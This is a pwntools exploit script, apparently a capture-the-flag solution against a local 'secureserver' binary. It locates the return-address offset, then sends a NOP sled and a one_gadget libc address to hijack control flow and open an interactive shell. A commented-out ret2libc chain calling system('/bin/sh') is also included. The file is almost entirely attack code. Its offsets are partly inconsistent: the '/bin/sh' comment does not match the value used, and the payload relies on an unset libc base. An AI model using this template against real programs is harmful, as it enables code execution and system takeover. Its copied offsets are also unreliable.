#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
exe = './secureserver'
e = context.binary = ELF(exe, checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = e.debug(gdbscript='''
source /home/nick/global/halfdisp.py
break *receive_feedback+32
c
'''
)
def find_ip(payload):
    p = process(exe)
    p.sendline(payload)
    p.wait()
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


offset = find_ip(cyclic(100))
# rop = ROP(exe)
# ret = rop.find_gadget(["ret"])


libc_base = 0x7ffff7c00000
# systemreadelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
#   1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
system = libc_base+0x50d70
#or
system = libc_base+libc.symbols.system

#strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh" 1d8678 /bin/sh
binsh=libc_base+0xebc88
# payload = flat([
#     offset*b"\x90",
#     p64(0x40120b),
#     binsh,
#     p64(0x401016),
#     system,

# ])
#or
payload = flat(
    asm('nop')*offset,
    libc.address + 0xebc81 #one_gadget /lib/x86_64-linux-gnu/libc.so.6
)
p.sendlineafter(b"flag.txt:",payload)
p.interactive()